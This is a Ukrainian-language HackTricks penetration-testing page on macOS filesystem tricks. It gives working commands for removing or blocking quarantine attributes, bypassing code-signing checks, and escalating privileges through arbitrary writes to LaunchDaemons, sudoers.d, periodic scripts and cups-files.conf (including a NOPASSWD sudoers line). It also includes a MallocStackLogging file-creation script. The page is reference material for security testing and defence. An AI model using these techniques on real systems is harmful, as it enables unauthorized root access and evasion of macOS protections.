# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Комбінації прав POSIX

Права в **каталозі**:

- **читання** - ви можете **перерахувати** записи каталогу
- **запис** - ви можете **видаляти/записувати** **файли** в каталозі і ви можете **видаляти порожні папки**.
- Але ви **не можете видаляти/модифікувати непорожні папки**, якщо у вас немає прав на запис.
- Ви **не можете змінювати назву папки**, якщо ви не є її власником.
- **виконання** - вам **дозволено проходити** через каталог - якщо у вас немає цього права, ви не можете отримати доступ до жодних файлів всередині, або в будь-яких підкаталогах.

### Небезпечні комбінації

**Як перезаписати файл/папку, що належить root**, але:

- Один батьківський **власник каталогу** в шляху є користувачем
- Один батьківський **власник каталогу** в шляху є **групою користувачів** з **доступом на запис**
- Група користувачів має **доступ на запис** до **файлу**

З будь-якою з попередніх комбінацій, зловмисник може **впровадити** **символічне/жорстке посилання** на очікуваний шлях, щоб отримати привілейований довільний запис.

### Спеціальний випадок папки root R+X

Якщо в **каталозі** є файли, до яких **тільки root має доступ R+X**, ці файли **не доступні нікому іншому**. Тому вразливість, що дозволяє **перемістити файл, доступний для читання користувачем**, який не може бути прочитаний через це **обмеження**, з цієї папки **в іншу**, може бути використана для читання цих файлів.

Приклад у: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Символічне посилання / Жорстке посилання

### Дозволений файл/папка

Якщо привілейований процес записує дані в **файл**, який може бути **контрольований** **менш привілейованим користувачем**, або який міг бути **раніше створений** менш привілейованим користувачем. Користувач може просто **вказати його на інший файл** через символічне або жорстке посилання, і привілейований процес запише в цей файл.

Перевірте в інших розділах, де зловмисник може **зловживати довільним записом для ескалації привілеїв**.

### Відкрити `O_NOFOLLOW`

Флаг `O_NOFOLLOW`, коли використовується функцією `open`, не буде слідувати за символічним посиланням в останньому компоненті шляху, але буде слідувати за рештою шляху. Правильний спосіб запобігти слідуванню за символічними посиланнями в шляху - це використання флага `O_NOFOLLOW_ANY`.

## .fileloc

Файли з розширенням **`.fileloc`** можуть вказувати на інші програми або бінарники, тому коли вони відкриваються, програма/бінарник буде виконана.\
Приклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Файлові дескриптори

### Leak FD (без `O_CLOEXEC`)

Якщо виклик `open` не має прапора `O_CLOEXEC`, файловий дескриптор буде успадкований дочірнім процесом. Отже, якщо привілейований процес відкриває привілейований файл і виконує процес, контрольований зловмисником, зловмисник **успадкує FD над привілейованим файлом**.

Якщо ви можете змусити **процес відкрити файл або папку з високими привілеями**, ви можете зловживати **`crontab`**, щоб відкрити файл у `/etc/sudoers.d` з **`EDITOR=exploit.py`**, так що `exploit.py` отримає FD до файлу всередині `/etc/sudoers` і зловживає ним.

Наприклад: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), код: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## Уникайте трюків з xattrs карантину

### Видалити це
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Якщо файл/папка має цей атрибут незмінності, не буде можливим встановити xattr на нього.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Монтування **devfs** **не підтримує xattr**, більше інформації в [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Цей ACL запобігає додаванню `xattrs` до файлу
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Формат файлу **AppleDouble** копіює файл разом з його ACE.

У [**джерельному коді**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) можна побачити, що текстове представлення ACL, збережене всередині xattr під назвою **`com.apple.acl.text`**, буде встановлено як ACL у розпакованому файлі. Отже, якщо ви стиснули додаток у zip-файл з форматом файлу **AppleDouble** з ACL, який заважає запису інших xattrs у нього... xattr карантину не було встановлено в додатку:

Перевірте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) для отримання додаткової інформації.

Щоб це відтворити, спочатку потрібно отримати правильний рядок acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Зверніть увагу, що навіть якщо це працює, пісочниця записує карантинний xattr перед цим)

Не зовсім необхідно, але я залишаю це на випадок:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Обхід перевірок підпису

### Обхід перевірок платформних бінарників

Деякі перевірки безпеки перевіряють, чи є бінарник **платформним бінарником**, наприклад, щоб дозволити підключення до служби XPC. Однак, як було показано в обході на https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, можливо обійти цю перевірку, отримавши платформний бінарник (такий як /bin/ls) і впровадивши експлойт через dyld, використовуючи змінну середовища `DYLD_INSERT_LIBRARIES`.

### Обхід прапорців `CS_REQUIRE_LV` та `CS_FORCED_LV`

Можливо, щоб виконуваний бінарник змінив свої власні прапорці, щоб обійти перевірки з кодом, таким як:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Обхід підписів коду

Пакунки містять файл **`_CodeSignature/CodeResources`**, який містить **хеш** кожного окремого **файлу** в **пакунку**. Зверніть увагу, що хеш CodeResources також **вбудований в виконуваний файл**, тому ми не можемо з цим нічого зробити.

Однак є деякі файли, підпис яких не буде перевірятися, у них є ключ omit у plist, такі як:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Можна обчислити підпис ресурсу з командного рядка за допомогою:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

Користувач може змонтувати користувацький dmg, створений навіть поверх деяких існуючих папок. Ось як ви можете створити користувацький dmg пакет з користувацьким вмістом:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Зазвичай macOS монтує диск, спілкуючись з Mach-сервісом `com.apple.DiskArbitrarion.diskarbitrariond` (який надається `/usr/libexec/diskarbitrationd`). Якщо додати параметр `-d` до plist-файлу LaunchDaemons і перезапустити, він зберігатиме журнали в `/var/log/diskarbitrationd.log`.\
Однак можливо використовувати інструменти, такі як `hdik` і `hdiutil`, для безпосереднього спілкування з kext `com.apple.driver.DiskImages`.

## Произвольні записи

### Періодичні sh скрипти

Якщо ваш скрипт може бути інтерпретований як **shell script**, ви можете перезаписати **`/etc/periodic/daily/999.local`** shell-скрипт, який буде запускатися щодня.

Ви можете **підробити** виконання цього скрипта за допомогою: **`sudo periodic daily`**

### Демони

Напишіть довільний **LaunchDaemon** на кшталт **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** з plist, що виконує довільний скрипт, наприклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Просто створіть скрипт `/Applications/Scripts/privesc.sh` з **командами**, які ви хочете виконати як root.

### Файл Sudoers

Якщо у вас є **довільний запис**, ви можете створити файл у папці **`/etc/sudoers.d/`**, надаючи собі **sudo** привілеї.

### Файли PATH

Файл **`/etc/paths`** є одним з основних місць, які заповнюють змінну середовища PATH. Ви повинні бути root, щоб перезаписати його, але якщо скрипт з **привілейованого процесу** виконує якусь **команду без повного шляху**, ви можете **перехопити** її, змінивши цей файл.

Ви також можете записувати файли в **`/etc/paths.d`**, щоб завантажити нові папки в змінну середовища `PATH`.

### cups-files.conf

Цю техніку було використано в [цьому звіті](https://www.kandji.io/blog/macos-audit-story-part1).

Створіть файл `/etc/cups/cups-files.conf` з наступним вмістом:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Це створить файл `/etc/sudoers.d/lpe` з правами 777. Додатковий сміття в кінці потрібно для створення журналу помилок.

Потім запишіть у `/etc/sudoers.d/lpe` необхідну конфігурацію для ескалації привілеїв, наприклад, `%staff ALL=(ALL) NOPASSWD:ALL`.

Потім знову змініть файл `/etc/cups/cups-files.conf`, вказавши `LogFilePerm 700`, щоб новий файл sudoers став дійсним, викликавши `cupsctl`.

### Втеча з пісочниці

Можливо втекти з пісочниці macOS за допомогою FS довільного запису. Для деяких прикладів перевірте сторінку [macOS Auto Start](../../../../macos-auto-start-locations.md), але поширеним є запис файлу налаштувань Terminal у `~/Library/Preferences/com.apple.Terminal.plist`, який виконує команду при запуску, і викликати його за допомогою `open`.

## Генерація записуваних файлів як інші користувачі

Це створить файл, що належить root, який можна записувати мною ([**код звідси**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Це також може працювати як privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Shared Memory

**POSIX спільна пам'ять** дозволяє процесам в операційних системах, що відповідають стандарту POSIX, отримувати доступ до спільної області пам'яті, що сприяє швидшій комунікації в порівнянні з іншими методами міжпроцесної комунікації. Це передбачає створення або відкриття об'єкта спільної пам'яті за допомогою `shm_open()`, встановлення його розміру за допомогою `ftruncate()`, і відображення його в адресному просторі процесу за допомогою `mmap()`. Процеси можуть безпосередньо читати з цієї області пам'яті та записувати в неї. Для управління одночасним доступом і запобігання пошкодженню даних часто використовуються механізми синхронізації, такі як м'ютекси або семафори. Нарешті, процеси знімають відображення та закривають спільну пам'ять за допомогою `munmap()` та `close()`, а за бажанням видаляють об'єкт пам'яті за допомогою `shm_unlink()`. Ця система особливо ефективна для швидкої та ефективної IPC в середовищах, де кілька процесів повинні швидко отримувати доступ до спільних даних.

<details>

<summary>Приклад коду виробника</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Приклад коду споживача</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Захищені дескриптори

**macOS захищені дескриптори** - це функція безпеки, введена в macOS для підвищення безпеки та надійності **операцій з дескрипторами файлів** у користувацьких додатках. Ці захищені дескриптори забезпечують спосіб асоціювання специфічних обмежень або "захисників" з дескрипторами файлів, які забезпечуються ядром.

Ця функція особливо корисна для запобігання певним класам вразливостей безпеки, таким як **несанкціонований доступ до файлів** або **умови гонки**. Ці вразливості виникають, коли, наприклад, один потік отримує доступ до дескриптора файлу, надаючи **іншому вразливому потоку доступ до нього** або коли дескриптор файлу **успадковується** вразливим дочірнім процесом. Деякі функції, пов'язані з цією функціональністю, включають:

- `guarded_open_np`: Відкриває FD з захисником
- `guarded_close_np`: Закриває його
- `change_fdguard_np`: Змінює прапори захисника на дескрипторі (навіть видаляючи захист)

## Посилання

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
